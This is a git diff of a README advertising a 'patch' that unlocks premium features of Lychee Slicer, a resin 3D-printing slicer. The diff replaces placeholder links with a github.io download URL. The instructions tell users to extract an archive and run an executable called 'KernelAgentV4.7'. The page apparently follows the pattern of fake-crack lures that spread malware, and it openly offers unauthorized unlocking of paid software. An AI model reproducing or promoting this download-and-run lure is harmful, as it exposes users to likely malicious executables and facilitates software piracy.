@@ -2,13 +2,15 @@
 
 This patch unlocks premium slicing features, fixes known UI/slicing issues, and optimizes export performance in Lychee Slicer for resin 3D printing, using `KernelAgentV4.7`.
 
-[![Download Lychee Patch](https://img.shields.io/badge/Download-Lychee_Slicer_Toolkit-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Lychee Patch](https://img.shields.io/badge/Download-Lychee_Slicer_Toolkit-blueviolet)](https://lychee-slicer-resin-optimizer-patch.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://lychee-slicer-resin-optimizer-patch.github.io/.github
+) section  
 2. 📁 **Extract the folder** to any location (e.g., `C:\LycheeFix`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7`  
 4. 🧠 The patch will auto-detect your installed Lychee Slicer version and apply resin-optimized configs  
